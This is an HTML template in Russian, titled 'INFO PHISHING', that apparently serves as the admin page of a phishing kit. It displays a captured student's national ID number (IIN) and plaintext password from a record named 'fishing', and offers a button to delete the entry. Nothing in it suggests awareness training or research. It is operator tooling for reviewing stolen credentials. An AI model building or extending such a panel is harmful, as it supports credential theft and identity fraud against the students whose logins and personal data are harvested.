<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>INFO PHISHING</title>

    <!-- Подключение Bootstrap -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">

    <!-- Дополнительные стили -->
    <style>
        body {
            background-color: #f8f9fa;
            font-family: 'Public Sans', sans-serif;
        }
        .container {
            margin-top: 50px;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .info-card {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .info-card h4 {
            margin-bottom: 20px;
        }
        .delete-btn {
            background-color: #dc3545;
            color: #fff;
            border: none;
        }
        .delete-btn:hover {
            background-color: #c82333;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>Информация о студенте</h1>
        <hr>
    </div>

    <!-- Карточка с информацией -->
    <div class="info-card">
        <h4>Подробная информация о студенте</h4>
        <p><b>ИИН: </b>{{ fishing.iin }}</p>
        <p><b>Пароль: </b>{{ fishing.password }}</p>

        <hr>

        <!-- Кнопка удаления -->
        <form action="/phishing/delete/{{ fishing.id }}" method="post">
            <button type="submit" class="btn delete-btn w-100">Удалить студента</button>
        </form>
    </div>
</div>

<!-- Подключение Bootstrap JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/js/bootstrap.bundle.min.js"></script>

</body>
</html>
